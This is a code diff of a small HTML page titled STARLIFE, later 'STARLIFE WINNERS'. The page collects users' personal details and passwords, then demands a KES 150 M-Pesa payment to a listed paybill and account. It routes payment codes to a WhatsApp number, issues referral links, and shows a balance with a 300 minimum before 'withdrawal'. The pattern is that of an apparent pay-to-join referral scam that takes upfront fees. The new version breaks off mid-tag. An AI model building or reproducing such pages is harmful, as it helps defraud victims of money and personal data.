@@ -1,1 +1,35 @@
-<!DOCTYPE html><meta charset="UTF-8"><title>STARLIFE</title><style>body{background:#080b1e;color:#fff;font-family:sans-serif;padding:6px}.c{max-width:380px;margin:auto;background:#11142d;padding:8px;border-radius:8px}input,button{width:100%;padding:7px;margin:3px 0;border-radius:5px;border:none}button{font-weight:bold}.g{background:#0f6}.y{background:#fc0}.hide{display:none}</style><div class="c" id="a"><h3 style="text-align:center">STARLIFE</h3><div id="sf"><input id="fn" placeholder="Name"><input id="un" placeholder="User"><input id="em" placeholder="Email"><input id="ph" placeholder="Phone"><input id="p1" type="password" placeholder="Pass"><input id="p2" type="password" placeholder="Confirm"><div id="se" style="color:#f44;font-size:11px;text-align:center"></div><button class="g" onclick="su()">SIGN UP</button><p onclick="sl()" style="text-align:center;font-size:11px">Login</p></div><div id="lf" class="hide"><input id="lu" placeholder="User"><input id="lp" type="password" placeholder="Pass"><div id="le" style="color:#f44;font-size:11px;text-align:center"></div><button class="g" onclick="li()">LOGIN</button><p onclick="ss()" style="text-align:center;font-size:11px">SignUp</p></div></div><div class="c hide" id="b"><h4 style="color:#f44;text-align:center">Pay 150</h4>Paybill 714777 Acc 440200282954<br><input id="mc" placeholder="CODE"><button class="y" onclick="ac()">SUBMIT</button><div id="pb" class="hide"><div style="background:#332200;color:#fc0;padding:5px;text-align:center">CODE <b id="cs"></b> PENDING</div></div></div><div class="c hide" id="d"><b id="du" style="background:#fc0;color:#000;padding:2px 5px;border-radius:6px;font-size:9px"></b><div id="ba" style="font-size:20px;color:#fc0;text-align:center"></div><div id="ml" style="font-size:8px;color:#fc0;word-break:break-all"></div><button class="y" onclick="cl()">COPY LINK</button>Inv:<b id="ic">0</b><button class="g" onclick="wd()">WITHDRAW</button></div><script>function R(){return new URLSearchParams(location.search).get('ref')||''}function G(){return JSON.parse(localStorage.getItem('u')||'{}')}function S(v){localStorage.setItem('u',JSON.stringify(v))}function sl(){sf.classList.add('hide');lf.classList.remove('hide')}function ss(){sf.classList.remove('hide');lf.classList.add('hide')}function su(){let f=fn.value.trim(),u=un.value.trim().toLowerCase(),e=em.value.trim(),h=ph.value.trim(),p=p1.value,q=p2.value;if(!f||!u||!e||!h||!p){se.innerText='Fill';return}if(p!=q){se.innerText='No match';return}let o=G();if(o[u]){se.innerText='Taken';return}o[u]={n:f,u:u,e:e,h:h,p:p,a:0,s:'i',b:0,i:0,rb:R(),c:''};S(o);localStorage.setItem('c',u);A()}function li(){let u=lu.value.trim().toLowerCase(),p=lp.value,o=G();if(!o[u]||o[u].p!=p){le.innerText='Wrong';return}localStorage.setItem('c',u);let x=o[u];if(x.s=='p')P();else if(!x.a)A();else D()}function A(){a.classList.add('hide');b.classList.remove('hide');d.classList.add('hide')}function P(){a.classList.add('hide');b.classList.remove('hide');d.classList.add('hide');cs.innerText=G()[localStorage.getItem('c')].c;pb.classList.remove('hide')}function ac(){let m=mc.value.trim().toUpperCase();if(m.length!=10||!/^[A-Z0-9]{10}$/.test(m)){alert('REAL CODE 10 chars');return}let k=localStorage.getItem('c'),o=G(),u=o[k];u.c=m;u.s='p';S(o);P();open('https://wa.me/254720119990?text=PAY 714777 440200282954 '+u.u+' '+m,'_blank')}function D(){let u=G()[localStorage.getItem('c')];a.classList.add('hide');b.classList.add('hide');d.classList.remove('hide');du.innerText=u.u;ba.innerText='KES '+u.b;ic.innerText=u.i;ml.innerText=location.origin+location.pathname+'?ref='+u.u}function cl(){navigator.clipboard.writeText(location.origin+location.pathname+'?ref='+G()[localStorage.getItem('c')].u);alert('Copied')}function wd(){let u=G()[localStorage.getItem('c')];if(u.b<300){alert('Min 300');return}open('https://wa.me/254720119990?text=WD '+u.u,'_blank')}onload=function(){let k=localStorage.getItem('c');if(k){let u=G()[k];if(u){if(u.s=='p')P();else if(!u.a)A();else D()}}}</script>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>STARLIFE WINNERS</title>
+<style>
+body{background:#0a0a0a;color:white;font-family:Arial;margin:0}
+.h{padding:12px;background:#111;display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #ffcc00}
+.logo{color:#ffcc00;font-weight:bold;font-size:20px}
+.main{padding:16px;max-width:500px;margin:auto}
+.c{background:#151515;border:1px solid #333;border-radius:12px;padding:16px;margin-bottom:16px}
+.payBox{background:#1a1a0a;border:1px solid #ffcc00;border-radius:10px;padding:14px;text-align:center;line-height:1.8}
+.mpesaBox{background:#0f1f0f;border-radius:8px;padding:12px;margin-top:12px}
+input{width:100%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:8px;background:#222;color:white;box-sizing:border-box;font-size:16px}
+button{width:100%;padding:14px;border:none;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:8px}
+.btn-pay{background:#00a651;color:white}
+#msg{text-align:center;font-weight:bold;margin-top:12px;display:none}
+.amount{color:#00ff66;font-size:22px;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="h"><div class="logo">★ STARLIFE WINNERS</div></div>
+<div class="main">
+<div class="c">
+<div class="payBox">
+<b>LIPA NA M-PESA</b><br>
+Paybill: <b>714777</b><br>
+Account: <b>440200282954</b><br>
+Amount: <span class="amount">KES 150</span>
+</div>
+<div class="mpesaBox">
+<input id="name" placeholder="Your Full Name">
+<input id="phone" placeholder="M-Pesa Phone 07...">
+<input id="code
